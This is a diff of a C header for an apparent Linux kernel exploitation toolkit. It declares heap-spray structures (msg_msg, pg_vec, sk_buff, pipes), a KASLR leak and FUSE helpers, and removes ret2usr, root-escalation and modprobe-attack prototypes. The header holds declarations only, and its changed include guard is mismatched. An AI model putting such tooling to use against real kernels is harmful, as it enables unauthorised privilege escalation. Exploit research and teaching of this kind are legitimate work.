@@ -1,12 +1,6 @@
 #define _GNU_SOURCE
-#ifndef LIBX
-#define LIBX
-#define PAGE_SIZE 0x1000
-#define TTYMAGIC 0x5401
-#define NO_ASLR_BASE 0xffffffff81000000
-#define SOCKET_NUM 8
-#define SK_BUFF_NUM 0x80
-#define PIPE_NUM 256
+#ifndef MYLIB_H
+#define LIBX "v1.0"
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
@@ -34,66 +28,58 @@
 #include <linux/if_packet.h>
 #include <keyutils.h>
 #include <sys/timerfd.h>
+#include <sys/resource.h>
 
-#define MSG_COPY        040000  /* copy (not remove) all queue messages */
+// Definations
+#define MSG_COPY                    040000  /* copy (not remove) all queue messages */
+#define TTYMAGIC                    0x5401
+#define PIPE_NUM                    256
+#define PAGE_SIZE                   0x1000
+#define SOCKET_NUM                  0x20
+#define unlikely(x)                 __builtin_expect(!!(x), 0)
+#define SK_BUFF_NUM                 0x40
+#define MSGMNB_FILE                 "/proc/sys/kernel/msgmnb"
+#define NO_ASLR_BASE                0xffffffff81000000
+#define cloneRoot_FLAG              CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
+#define OPTMEM_MAX_FILE             "/proc/sys/net/core/optmem_max"
+#define INITIAL_PG_VEC_SPRAY        0x200
 
-/*
-    Name: msgSpray_t
-    Desc:
-        describe one msgqueue while spraying
-    Example:
-        ;
-*/
+
+// Structs
 typedef struct msgSpray_t {
     struct msgSpray_t *next;
 	__u8 *ctx;
 	size_t size;
 	size_t num;
     int msg_id;
-
 } msgSpray_t;
-
-
-typedef size_t u64;
-// size_t user_cs, user_ss, user_rflags, user_sp;
-char* hex(size_t num);
-void panic(const char *text);
-void shell();
-void info(const char *text);
-void* userfaultfd_leak_handler(void*);
-size_t * forze();
-
-// Part I: Basics, not specific-technique-related
-void hook_segfault();
-void save_status();
-void setsuid(char *);
-void DEBUG();
-__u8 *p64(size_t);
-__u8 * dp(__u8 * c,size_t n);
-__u8 * flatn(size_t *values,size_t n);
-int findp64(__u8 *stack,size_t value, size_t n);
-char *str(int a);
-size_t xswab(size_t);
-void modprobeAtk(char * path, char * cmd);
-// Part II: MSGMSG related
 typedef struct msgQueueMsg{
     long mtype;
     char mtext[1];
 } msgMsg;
-// int msgQueueCreate(char *s);
-int msgGet();
-void msgSend(int msgid,size_t size,char *text);
-msgMsg* msgRecv(int msgid,size_t size);
-void msgDel(int msgid);
+typedef size_t u64;
+enum PG_VEC_CMD {
+    ADD,
+    FREE,
+    EXIT
+};
 
-// Part III: ret2usr
-extern size_t commit_creds;
-extern size_t prepare_kernel_cred;
-extern void (*back2user)();
-void getRootPrivilige();
-msgSpray_t * msgSpray(size_t msg_len,size_t num, __u8 *ctx);
+typedef struct
+{
+    enum PG_VEC_CMD cmd;
+    int32_t idx;
+    size_t order;
+    size_t nr;
+}ipc_req_t;
 
-extern int  leakKASLR();
-extern void * initFuse(void);
+
+
+// Externel funcs
+extern int          leakKASLR();
+extern void *       initFuse(void);
+extern int sk_fd[0x20][2];
+extern int pipe_fd[PIPE_NUM*4][2];
+
+// Export global vas
+
 #endif
-
